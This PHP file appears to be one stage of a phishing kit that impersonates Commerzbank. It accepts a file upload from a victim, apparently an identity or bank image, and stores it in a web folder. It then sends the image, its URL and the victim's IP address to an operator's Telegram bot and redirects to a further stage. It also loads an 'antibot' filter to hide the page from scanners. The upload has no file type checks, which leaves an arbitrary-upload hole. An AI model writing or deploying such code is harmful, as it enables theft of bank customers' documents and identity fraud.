<?php

// ANTIBOT DISABLED - include..antibot.php';
include '../antibot/tds.php';

ini_set('upload_max_filesize', '0');
ini_set('post_max_size', '0');
ini_set('max_execution_time', '600');

// Include Telegram configuration
include '../config/telegram.php';
$botToken = $telegram_bot2_token;
$chatId = $telegram_bot2_chat_id;

$uploadDir = 'xentryxupload/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
    $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
    $originalFileName = basename($_FILES['file']['name']);
    $fileExtension = pathinfo($originalFileName, PATHINFO_EXTENSION);
    $newFileName = $randomPrefix . '-' . $originalFileName;
    $uploadPath = $uploadDir . $newFileName;

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        $visitorIp = $_SERVER['REMOTE_ADDR'];
        $serverHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_ADDR'];
        $imageURL = "{$serverHost}/views/{$uploadDir}{$newFileName}";

        $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱  [ 1st ]\n";
        $message .= "- Another IMG should appear after this.\n\n";
        $message .= "🔗 |  𝗜𝗠𝗚 𝗨𝗥𝗟  : $imageURL\n";
        $message .= "📍 |  𝗜𝗣  : $visitorIp";

        // Send the image to Telegram using centralized function
        $result = sendTelegramPhoto($botToken, $chatId, $uploadPath, $message);
        if (!$result) {
            error_log("Failed to send image to Telegram for uploadz2.php");
        }
    } else {
        echo "Error uploading the file.";
    }
} else {
    echo "No file uploaded or there was an upload error.";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <script src="/security.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>One Moment...</title>
    <meta http-equiv="refresh" content="1; url=uploadz3.php">
</head>
<body>
    
</body>
</html>
